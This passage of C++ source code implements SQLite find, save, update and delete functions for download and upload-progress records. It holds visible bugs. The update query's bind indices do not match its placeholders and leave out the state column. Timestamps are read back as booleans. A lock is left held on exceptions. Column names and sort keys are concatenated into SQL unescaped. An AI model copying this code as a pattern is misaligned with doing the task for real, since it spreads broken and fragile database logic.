        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
    }

    try
    {
        while (statement->executeStep())
        {
            Download instance = Download();

            instance.client_id = statement->getColumn(0).getString();
            instance.link = statement->getColumn(1).getString();
            instance.args = statement->getColumn(2).getString();
            instance.type = statement->getColumn(3).getInt();
            instance.created_at = statement->getColumn(4).getInt64();
            instance.updated_at = statement->getColumn(5).getInt64();
            instance.id = statement->getColumn(6).getString();
            instance.local_id = statement->getColumn(7).getInt();
            instance.completed = statement->getColumn(8).getInt() > 0;
            instance.stopped = statement->getColumn(9).getInt() > 0;

            results.push_back(instance);
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return results;
}
bool deleteDownload(int64_t id)
{
    std::string queryStr = R"(
    DELETE from Download where local_id = ?
)";
    SQLite::Statement statement(*db, queryStr);
    statement.bind(1, id);
    try
    {
        if (statement.exec() > 0)
        {
            return true;
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return false;
}
std::shared_ptr<UploadProgress> SaveUploadProgress(UploadProgress instance)
{

    std::shared_ptr<UploadProgress> result = nullptr;
    std::string queryStr = R"(
    INSERT INTO UploadProgress (machine_id , path , complete, uploaded ,size , state ,rate ,eta , drive_id, error ,created_at ,updated_at ,id , stopped , doneWithUpdate) VALUES ( ? , ? , ? , ? , ? , ? , ? , ? ,? , ? , ? ,? , ? , ? , ? )
)";
    dbMutex.lock();
    SQLite::Statement statement(*db, queryStr);
    if (instance.created_at == 0)
    {
        instance.created_at = getSystemTime();
    }
    instance.updated_at = getSystemTime();

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, instance.machine_id);
    statement.bind(2, instance.path);
    statement.bind(3, instance.complete ? 1 : 0);
    statement.bind(4, instance.uploaded);
    statement.bind(5, instance.size);
    statement.bind(6, instance.state);
    statement.bind(7, instance.rate);
    statement.bind(8, instance.eta);
    statement.bind(9, instance.drive_id);
    statement.bind(10, instance.error);
    statement.bind(11, instance.created_at);
    statement.bind(12, instance.updated_at);
    statement.bind(13, instance.id);
    statement.bind(14, instance.stopped);
    statement.bind(15, instance.doneWithUpdate);

    int rows = statement.exec();
    if (rows > 0)
    {
        int64_t id = (int64_t)sqlite3_last_insert_rowid(db->getHandle());
        if (id > 0)
        {
            result = findUploadProgress(id);
        }
    }
    dbMutex.unlock();
    return result;
}
std::shared_ptr<app::UploadProgress> UpdateUploadProgress(app::UploadProgress instance)
{

    std::shared_ptr<UploadProgress> result = nullptr;
    std::string queryStr = R"(
    UPDATE UploadProgress SET machine_id = ? , path = ? , complete = ? , uploaded = ?,size =? ,rate = ?, eta = ? , drive_id = ? , error = ? ,created_at = ? , updated_at = ? , id = ? , stopped = ? , doneWithUpdate = ? where local_id = ? 
    )";
    SQLite::Statement statement(*db, queryStr);

    instance.updated_at = getSystemTime();

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, instance.machine_id);
    statement.bind(2, instance.path);
    statement.bind(3, instance.complete ? 1 : 0);
    statement.bind(4, instance.uploaded);
    statement.bind(5, instance.size);
    statement.bind(6, instance.state);
    statement.bind(7, instance.rate);
    statement.bind(8, instance.eta);
    statement.bind(9, instance.drive_id);
    statement.bind(10, instance.error);
    statement.bind(11, instance.created_at);
    statement.bind(12, instance.updated_at);
    statement.bind(13, instance.id);
    statement.bind(14, instance.stopped);
    statement.bind(15, instance.doneWithUpdate);
    statement.bind(16, instance.local_id);

    dbMutex.lock();
    int rows = statement.exec();
    if (rows > 0)
    {
        result = findUploadProgress(instance.local_id);
    }
    dbMutex.unlock();
    return result;
}
std::shared_ptr<app::UploadProgress> findUploadProgress(int64_t id)
{
    std::shared_ptr<app::UploadProgress> result = nullptr;

    std::map<std::string, DBValue> q;

    DBValue val;
    val.intValue = std::make_shared<int64_t>(id);
    val.equality = DBEquality::EQUAL;

    q.emplace("local_id", val);

    try
    {
        auto lst = findUploadProgresses(q, 1);
        if (!lst.empty())
        {
            result = std::make_shared<app::UploadProgress>(lst[0]);
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return result;
}
std::vector<app::UploadProgress> findUploadProgresses(std::map<std::string, DBValue> params, int limit, std::string orderKey, bool desc)
{
    std::vector<app::UploadProgress> results;

    std::shared_ptr<SQLite::Statement> statement;
    std::string queryStr = R"(
    SELECT * from UploadProgress 
)";
    if (params.size() > 0)
    {
        int loop = 1;
        int counter = 0;
        queryStr += " where ";
        for (auto &param : params)
        {
            if (counter > 0)
            {
                queryStr += " AND ";
            }
            counter++;
            queryStr += param.first;
            queryStr += " ";
            std::string equality = "=";
            switch (param.second.equality)
            {
            case DBEquality::EQUAL:
                equality = "=";
                break;
            case DBEquality::LESSTHAN:
                equality = "<";
                break;
            case DBEquality::GREATERTHAN:
                equality = ">";
                break;

            default:
                equality = "=";
                break;
            }
            queryStr += equality + " ?";
        }
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
        for (auto &param : params)
        {
            if (param.second.boolValue != nullptr)
            {
                statement->bind(loop, *param.second.boolValue);
            }
            else if (param.second.doubleValue != nullptr)
            {
                statement->bind(loop, *param.second.doubleValue);
            }
            else if (param.second.intValue != nullptr)
            {
                statement->bind(loop, *param.second.intValue);
            }
            else if (param.second.stringValue != nullptr)
            {
                statement->bind(loop, *param.second.stringValue);
            }
            loop++;
        }
    }
    else
    {
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
    }

    try
    {
        while (statement->executeStep())
        {
            app::UploadProgress instance;

            instance.machine_id = statement->getColumn(0).getString();
            instance.path = statement->getColumn(1).getString();
            instance.complete = statement->getColumn(2).getInt() > 0;
            instance.uploaded = statement->getColumn(3).getInt64();
            instance.size = statement->getColumn(4).getInt64();
            instance.state = statement->getColumn(5).getInt();
            instance.local_id = statement->getColumn(6).getInt64();
            instance.rate = statement->getColumn(7).getInt64();
            instance.eta = statement->getColumn(8).getInt64();
            instance.drive_id = statement->getColumn(9).getString();
            instance.error = statement->getColumn(10).getString();
            instance.created_at = statement->getColumn(11).getInt() > 0;
            instance.updated_at = statement->getColumn(12).getInt() > 0;
            instance.id = statement->getColumn(13).getString();
            instance.stopped = statement->getColumn(14).getInt() > 0;
            instance.doneWithUpdate = statement->getColumn(15).getInt() > 0;

            results.push_back(instance);
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return results;
}
bool deleteUploadProgress(int64_t id)
{
    std::string queryStr = R"(
    DELETE from UploadProgress where local_id = ?
)";
    SQLite::Statement statement(*db, queryStr);
    statement.bind(1, id);
    try
    {
        if (statement.exec() > 0)
        {
            return true;
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return false;
}